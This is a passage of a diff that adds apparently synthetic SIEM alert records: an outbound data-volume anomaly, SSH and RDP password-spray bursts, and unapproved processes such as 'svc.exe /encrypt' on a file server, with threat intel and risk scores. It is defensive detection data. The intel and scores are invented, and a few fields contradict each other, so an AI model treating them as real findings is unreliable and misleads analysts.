+      "host.name": "ws-hr-07.corp.local"
+    },
+    "group_key": "ws-hr-07.corp.local",
+    "first_event_ts": "2026-10-25T01:15:00Z",
+    "last_event_ts": "2026-10-25T01:15:00Z",
+    "detected_at": "2026-10-25T01:15:00Z",
+    "event_count": 2,
+    "event_ids": [
+      "EVT-001069",
+      "EVT-001073"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001069",
+        "ts": "2026-10-25T01:00:00Z",
+        "action": "firewall_allow",
+        "message": "allow tcp 10.10.2.7->203.0.113.199:443 rule=lan-to-wan-web"
+      },
+      {
+        "event_id": "EVT-001073",
+        "ts": "2026-10-25T01:15:00Z",
+        "action": "firewall_allow",
+        "message": "allow tcp 10.10.2.7->203.0.113.199:443 rule=lan-to-wan-web"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "203.0.113.199",
+        "threat_type": "Denial of Service",
+        "confidence": "medium",
+        "source": "Anomali",
+        "first_seen": "2026-10-18",
+        "last_seen": "2026-10-25",
+        "tags": "ddos,http-flood",
+        "description": "Source of volumetric HTTP floods against retail portals"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "summary": "Outbound volume anomaly on ws-hr-07.corp.local: 2.1 GB in 2026-10-25T01:00 versus median 311.3 KB (robust z=13069.8)",
+    "false_positive_notes": "",
+    "observables": {
+      "source_ips": [
+        "10.10.2.7"
+      ],
+      "destination_ips": [
+        "203.0.113.199"
+      ],
+      "domains": [],
+      "users": [],
+      "hosts": [
+        "ws-hr-07.corp.local"
+      ],
+      "files": []
+    },
+    "observed_value": 2202009600.0,
+    "observed_human": "2.1 GB",
+    "baseline_median": 318792.0,
+    "baseline_sigma": 168455.98,
+    "baseline_basis": "host",
+    "anomaly_score": 13069.83,
+    "bucket": "2026-10-25T01",
+    "risk_score": 75,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 3,
+      "asset": "ws-hr-07.corp.local",
+      "threat_intel": 6,
+      "volume_corroboration": 4,
+      "confidence_penalty": -8
+    },
+    "asset": {
+      "hostname": "ws-hr-07.corp.local",
+      "ip": "10.10.2.7",
+      "role": "HR Workstation",
+      "criticality": "Medium",
+      "business_unit": "HR",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true,
+    "alert_id": "ALT-2026-0033"
+  },
+  {
+    "rule_id": "ANO-002",
+    "rule_name": "Authentication failure spike",
+    "description": "Hourly failed authentications from a source IP exceed the ten week baseline by more than four robust standard deviations.",
+    "type": "anomaly",
+    "feature": "auth_failures_per_source_ip_hour",
+    "method": "robust_zscore",
+    "base_severity": "High",
+    "confidence": 0.6,
+    "incident_type": "Brute Force",
+    "playbook": "PB-BRUTE-FORCE",
+    "mitre": [
+      {
+        "id": "T1110",
+        "tactic": "Credential Access",
+        "technique": "Brute Force"
+      }
+    ],
+    "entity": {
+      "source.ip": "203.0.113.44"
+    },
+    "group_key": "203.0.113.44",
+    "first_event_ts": "2026-10-22T03:11:00Z",
+    "last_event_ts": "2026-10-22T03:11:00Z",
+    "detected_at": "2026-10-22T03:11:00Z",
+    "event_count": 12,
+    "event_ids": [
+      "EVT-000710",
+      "EVT-000711",
+      "EVT-000712",
+      "EVT-000713",
+      "EVT-000714",
+      "EVT-000715",
+      "EVT-000716",
+      "EVT-000717",
+      "EVT-000718",
+      "EVT-000719",
+      "EVT-000720",
+      "EVT-000721"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000710",
+        "ts": "2026-10-22T03:00:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for root from 203.0.113.44 port 39197 ssh2"
+      },
+      {
+        "event_id": "EVT-000711",
+        "ts": "2026-10-22T03:01:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user admin from 203.0.113.44 port 59401 ssh2"
+      },
+      {
+        "event_id": "EVT-000712",
+        "ts": "2026-10-22T03:02:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user test from 203.0.113.44 port 48477 ssh2"
+      },
+      {
+        "event_id": "EVT-000713",
+        "ts": "2026-10-22T03:03:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user oracle from 203.0.113.44 port 46674 ssh2"
+      },
+      {
+        "event_id": "EVT-000714",
+        "ts": "2026-10-22T03:04:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for deploy from 203.0.113.44 port 40544 ssh2"
+      },
+      {
+        "event_id": "EVT-000715",
+        "ts": "2026-10-22T03:05:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for ubuntu from 203.0.113.44 port 42131 ssh2"
+      },
+      {
+        "event_id": "EVT-000716",
+        "ts": "2026-10-22T03:06:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for root from 203.0.113.44 port 48584 ssh2"
+      },
+      {
+        "event_id": "EVT-000717",
+        "ts": "2026-10-22T03:07:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user admin from 203.0.113.44 port 54647 ssh2"
+      },
+      {
+        "event_id": "EVT-000718",
+        "ts": "2026-10-22T03:08:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user test from 203.0.113.44 port 47983 ssh2"
+      },
+      {
+        "event_id": "EVT-000719",
+        "ts": "2026-10-22T03:09:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user oracle from 203.0.113.44 port 53243 ssh2"
+      },
+      {
+        "event_id": "EVT-000720",
+        "ts": "2026-10-22T03:10:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for deploy from 203.0.113.44 port 59229 ssh2"
+      },
+      {
+        "event_id": "EVT-000721",
+        "ts": "2026-10-22T03:11:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for ubuntu from 203.0.113.44 port 59480 ssh2"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "203.0.113.44",
+        "threat_type": "Brute Force",
+        "confidence": "high",
+        "source": "AbuseIPDB",
+        "first_seen": "2026-10-14",
+        "last_seen": "2026-10-25",
+        "tags": "ssh,credential-attack",
+        "description": "Host reported for repeated SSH password spraying against internet-facing servers"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "summary": "Authentication failure spike from 203.0.113.44: 12 failures in 2026-10-22T03:00 versus median 1 (robust z=11.0) against web-srv-02.corp.local",
+    "false_positive_notes": "",
+    "observables": {
+      "source_ips": [
+        "203.0.113.44"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "admin",
+        "deploy",
+        "oracle",
+        "root",
+        "test",
+        "ubuntu"
+      ],
+      "hosts": [
+        "web-srv-02.corp.local"
+      ],
+      "files": []
+    },
+    "observed_value": 12.0,
+    "baseline_median": 1.0,
+    "baseline_sigma": 1.0,
+    "baseline_basis": "environment",
+    "anomaly_score": 11.0,
+    "bucket": "2026-10-22T03",
+    "affected_hosts": [
+      "web-srv-02.corp.local"
+    ],
+    "risk_score": 81,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 3,
+      "asset": "203.0.113.44",
+      "threat_intel": 12,
+      "volume_corroboration": 4,
+      "confidence_penalty": -8
+    },
+    "intel_high_confidence": true,
+    "alert_id": "ALT-2026-0008"
+  },
+  {
+    "rule_id": "ANO-002",
+    "rule_name": "Authentication failure spike",
+    "description": "Hourly failed authentications from a source IP exceed the ten week baseline by more than four robust standard deviations.",
+    "type": "anomaly",
+    "feature": "auth_failures_per_source_ip_hour",
+    "method": "robust_zscore",
+    "base_severity": "High",
+    "confidence": 0.6,
+    "incident_type": "Brute Force",
+    "playbook": "PB-BRUTE-FORCE",
+    "mitre": [
+      {
+        "id": "T1110",
+        "tactic": "Credential Access",
+        "technique": "Brute Force"
+      }
+    ],
+    "entity": {
+      "source.ip": "203.0.113.44"
+    },
+    "group_key": "203.0.113.44",
+    "first_event_ts": "2026-10-25T04:11:00Z",
+    "last_event_ts": "2026-10-25T04:11:00Z",
+    "detected_at": "2026-10-25T04:11:00Z",
+    "event_count": 12,
+    "event_ids": [
+      "EVT-001076",
+      "EVT-001077",
+      "EVT-001078",
+      "EVT-001079",
+      "EVT-001080",
+      "EVT-001081",
+      "EVT-001082",
+      "EVT-001083",
+      "EVT-001084",
+      "EVT-001085",
+      "EVT-001086",
+      "EVT-001087"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001076",
+        "ts": "2026-10-25T04:00:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001077",
+        "ts": "2026-10-25T04:01:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001078",
+        "ts": "2026-10-25T04:02:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001079",
+        "ts": "2026-10-25T04:03:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001080",
+        "ts": "2026-10-25T04:04:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001081",
+        "ts": "2026-10-25T04:05:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001082",
+        "ts": "2026-10-25T04:06:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001083",
+        "ts": "2026-10-25T04:07:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001084",
+        "ts": "2026-10-25T04:08:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001085",
+        "ts": "2026-10-25T04:09:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001086",
+        "ts": "2026-10-25T04:10:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001087",
+        "ts": "2026-10-25T04:11:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "203.0.113.44",
+        "threat_type": "Brute Force",
+        "confidence": "high",
+        "source": "AbuseIPDB",
+        "first_seen": "2026-10-14",
+        "last_seen": "2026-10-25",
+        "tags": "ssh,credential-attack",
+        "description": "Host reported for repeated SSH password spraying against internet-facing servers"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "summary": "Authentication failure spike from 203.0.113.44: 12 failures in 2026-10-25T04:00 versus median 1 (robust z=11.0) against jump-01.corp.local",
+    "false_positive_notes": "",
+    "observables": {
+      "source_ips": [
+        "203.0.113.44"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "administrator"
+      ],
+      "hosts": [
+        "jump-01.corp.local"
+      ],
+      "files": []
+    },
+    "observed_value": 12.0,
+    "baseline_median": 1.0,
+    "baseline_sigma": 1.0,
+    "baseline_basis": "environment",
+    "anomaly_score": 11.0,
+    "bucket": "2026-10-25T04",
+    "affected_hosts": [
+      "jump-01.corp.local"
+    ],
+    "risk_score": 81,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 3,
+      "asset": "203.0.113.44",
+      "threat_intel": 12,
+      "volume_corroboration": 4,
+      "confidence_penalty": -8
+    },
+    "intel_high_confidence": true,
+    "alert_id": "ALT-2026-0037"
+  },
+  {
+    "rule_id": "ANO-003",
+    "rule_name": "First-seen process on endpoint",
+    "description": "A process executes on an endpoint that has never been observed on that host and is absent from the approved software baseline.",
+    "type": "anomaly",
+    "feature": "first_seen_process",
+    "method": "novelty",
+    "base_severity": "Medium",
+    "confidence": 0.55,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1204",
+        "tactic": "Execution",
+        "technique": "User Execution"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-fin-14.corp.local",
+      "process.name": "invoice_2026.exe"
+    },
+    "group_key": "ws-fin-14.corp.local|invoice_2026.exe",
+    "first_event_ts": "2026-10-23T09:37:00Z",
+    "last_event_ts": "2026-10-23T09:37:00Z",
+    "detected_at": "2026-10-23T09:37:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000829"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000829",
+        "ts": "2026-10-23T09:37:00Z",
+        "action": "process_created",
+        "message": "process created invoice_2026.exe"
+      }
+    ],
+    "intel": [
+      {
+        "type": "sha256",
+        "value": "4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f90112233445566778899aabbccddeeff00",
+        "threat_type": "Malware",
+        "confidence": "high",
+        "source": "ThreatConnect",
+        "first_seen": "2026-10-16",
+        "last_seen": "2026-10-26",
+        "tags": "loader,powershell",
+        "description": "Signed-loLBin PowerShell loader used for initial execution"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "summary": "Novel process 'invoice_2026.exe' executed on ws-fin-14.corp.local for the first time in the observed period (not in approved software baseline)",
+    "false_positive_notes": "",
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": []
+    },
+    "observed_value": "invoice_2026.exe",
+    "baseline_basis": "software-baseline",
+    "anomaly_score": null,
+    "command_line": "invoice_2026.exe /quiet",
+    "user": "j.patel",
+    "risk_score": 63,
+    "severity": "Medium",
+    "score_breakdown": {
+      "base_rule_severity": 45,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 12,
+      "volume_corroboration": 4,
+      "confidence_penalty": -8
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true,
+    "alert_id": "ALT-2026-0016"
+  },
+  {
+    "rule_id": "ANO-003",
+    "rule_name": "First-seen process on endpoint",
+    "description": "A process executes on an endpoint that has never been observed on that host and is absent from the approved software baseline.",
+    "type": "anomaly",
+    "feature": "first_seen_process",
+    "method": "novelty",
+    "base_severity": "Medium",
+    "confidence": 0.55,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1204",
+        "tactic": "Execution",
+        "technique": "User Execution"
+      }
+    ],
+    "entity": {
+      "host.name": "fs01.corp.local",
+      "process.name": "svc.exe"
+    },
+    "group_key": "fs01.corp.local|svc.exe",
+    "first_event_ts": "2026-10-24T02:23:00Z",
+    "last_event_ts": "2026-10-24T02:23:00Z",
+    "detected_at": "2026-10-24T02:23:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-001059"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001059",
+        "ts": "2026-10-24T02:23:00Z",
+        "action": "process_created",
+        "message": "process created svc.exe"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "summary": "Novel process 'svc.exe' executed on fs01.corp.local for the first time in the observed period (not in approved software baseline)",
+    "false_positive_notes": "",
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "SYSTEM"
+      ],
+      "hosts": [
+        "fs01.corp.local"
+      ],
+      "files": []
+    },
+    "observed_value": "svc.exe",
+    "baseline_basis": "software-baseline",
+    "anomaly_score": null,
+    "command_line": "svc.exe /encrypt",
+    "user": "SYSTEM",
+    "risk_score": 51,
+    "severity": "Medium",
+    "score_breakdown": {
+      "base_rule_severity": 45,
+      "asset_criticality": 10,
+      "asset": "fs01.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 4,
+      "confidence_penalty": -8
+    },
+    "asset": {
+      "hostname": "fs01.corp.local",
+      "ip": "10.10.0.20",
+      "role": "File Server",
+      "criticality": "Critical",
+      "business_unit": "IT",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false,
+    "alert_id": "ALT-2026-0029"
+  }
+]
